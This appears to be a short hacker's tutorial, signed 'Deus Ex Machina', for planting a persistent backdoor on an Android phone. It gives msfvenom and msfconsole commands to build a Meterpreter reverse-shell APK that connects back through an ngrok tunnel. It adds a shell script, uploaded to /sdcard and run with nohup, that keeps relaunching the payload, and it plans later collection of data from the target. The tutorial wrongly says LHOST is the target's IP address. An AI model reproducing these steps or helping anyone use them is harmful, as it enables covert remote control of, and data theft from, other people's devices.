########################################      BY DEUS EX MACHINA      ##################################################
##### register and set up ngrok from the instructions on the site
##### go to the direcory in which ngrok is  in the type"
./ngrok tcp $port 
##### where $port is the port you want to open for using msfvenom on your pc


##### in your terminal, msfvenom terminal or metasploit terminal, type

msfvenom -p android/meterpreter/reverse_tcp LHOST=$ipaddress LPORT=$port R>payloadname.apk
##### where $ipaddress is the ip address of the target device and $lport is the port you opened on your device.
##### now go ahead to type the following

msfconsole -q \
use exploit/multi/handler \
set PAYLOAD android/meterpreter/reverse_tcp \
set LHOST 0.0.0.0 \
set LPORT $port \
run 
##### now you can go ahead to install the exploit on the device and open it and you will see a metapreter session in your terminal where you can run your commands
#next we will run a script to keep our exploit running


##### create shell script the following shell script:
#!/bin/sh \
while : \
do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MAinActivity \
sleep 10 \
done 

##### save the script on your machine and now in your meterpreter session type these

shell \
cd /sdcard \
upload ~/path 
##### where ~/path is the location of the shell script you have created on your machine
##### no we are done uploading the script to the target device, we need to run it by this command

nohup sh autostart.sh
##### our script is now running. we can now exit with:
CTRL + C \
Y 
##### now we have a persistent backdoor in the system

##### To do
- offline operation on phone and information uploaded from target on connect

########################################      KEEP IT AS RECEIVED      ##################################################


